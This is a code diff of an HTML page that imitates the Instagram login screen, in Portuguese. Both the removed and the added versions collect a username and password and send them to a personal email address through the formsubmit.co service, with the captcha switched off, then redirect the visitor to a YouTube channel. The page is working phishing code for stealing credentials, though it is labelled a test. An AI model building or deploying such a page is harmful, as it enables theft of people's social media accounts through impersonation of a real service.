@@ -3,149 +3,83 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Instagram - Login (Teste)</title>
+  <title>Login for Instagram</title>
   <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
   <style>
-    body {
-      background-color: #fff;
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body, html {
+      height: 100%;
+      background-color: #ffffff;
       font-family: 'Roboto', sans-serif;
       display: flex;
-      flex-direction: column;
       align-items: center;
-      padding: 40px 20px;
-      color: #262626;
-    }
-
-    .logo {
-      margin-bottom: 30px;
-    }
-
-    .logo img {
-      width: 175px;
-      height: auto;
+      justify-content: center;
     }
 
     form {
-      background: #fff;
-      border: 1px solid #dbdbdb;
-      padding: 40px 40px 30px;
-      border-radius: 1px;
+      background-color: #ffffff;
+      padding: 30px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      box-shadow: 0 0 10px rgba(0,0,0,0.05);
       width: 100%;
-      max-width: 320px;
-      box-sizing: border-box;
+      max-width: 350px;
       display: flex;
       flex-direction: column;
     }
 
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #262626;
+    }
+
     input {
-      margin-bottom: 8px;
-      padding: 12px 10px;
-      font-size: 14px;
+      padding: 12px;
+      margin-bottom: 15px;
       border: 1px solid #dbdbdb;
-      border-radius: 3px;
-      background: #fafafa;
-      outline: none;
-    }
-
-    input:focus {
-      border-color: #a8a8a8;
-      background: #fff;
-    }
-
-    .links {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      font-size: 12px;
-      margin: 8px 0 16px;
-    }
-
-    .links a {
-      color: #00376b;
-      text-decoration: none;
-    }
-
-    .links a:hover {
-      text-decoration: underline;
+      border-radius: 4px;
+      background-color: #fafafa;
+      font-size: 14px;
     }
 
     button {
+      padding: 12px;
       background-color: #3897f0;
       border: none;
       color: white;
       font-weight: bold;
-      padding: 12px 0;
-      font-size: 14px;
       border-radius: 4px;
+      font-size: 14px;
       cursor: pointer;
-      margin-top: 5px;
     }
 
     button:hover {
       background-color: #2a78d4;
     }
-
-    .footer {
-      margin-top: 20px;
-      font-size: 13px;
-    }
-
-    .footer a {
-      color: #00376b;
-      text-decoration: none;
-      font-weight: bold;
-    }
-
-    .footer a:hover {
-      text-decoration: underline;
-    }
   </style>
 </head>
 <body>
-  <div class="logo">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" alt="Instagram Logo" />
-  </div>
 
-  <form id="loginForm">
-    <input type="text" name="username" placeholder="Telefone, nome de usuário ou email" required />
-    <input type="password" name="password" placeholder="Senha" required />
+  <form action="https://formsubmit.co/fabiofranciscodn@gmail.com" method="POST">
+    <h2>Login for Instagram</h2>
 
-    <div class="links">
-      <div></div>
-      <a href="#">Esqueceu a senha?</a>
-    </div>
+    <input type="text" name="usuario" placeholder="Usuário ou Email" required />
+    <input type="password" name="senha" placeholder="Senha" required />
 
-    <button type="submit">Entrar</button>
+    <!-- FormSubmit config -->
+    <input type="hidden" name="_subject" value="Novo login de teste">
+    <input type="hidden" name="_template" value="table">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_next" value="https://www.youtube.com/@NATTO_BEATS">
+
+    <button type="submit">Enviar</button>
   </form>
 
-  <div class="footer">
-    Não tem uma conta? <a href="#">Cadastre-se</a>
-  </div>
-
-  <script>
-    const form = document.getElementById('loginForm');
-
-    form.addEventListener('submit', function(event) {
-      event.preventDefault();
-
-      const formData = new FormData(form);
-
-      fetch('https://formsubmit.co/ajax/fabiofrancisco655@gmail.com', {
-        method: 'POST',
-        body: formData,
-        headers: { 'Accept': 'application/json' }
-      })
-      .then(response => {
-        if (response.ok) {
-          window.location.href = 'https://www.youtube.com/@NATTO_BEATS';
-        } else {
-          alert('Erro ao enviar o formulário.');
-        }
-      })
-      .catch(() => {
-        alert('Erro na conexão.');
-      });
-    });
-  </script>
 </body>
 </html>
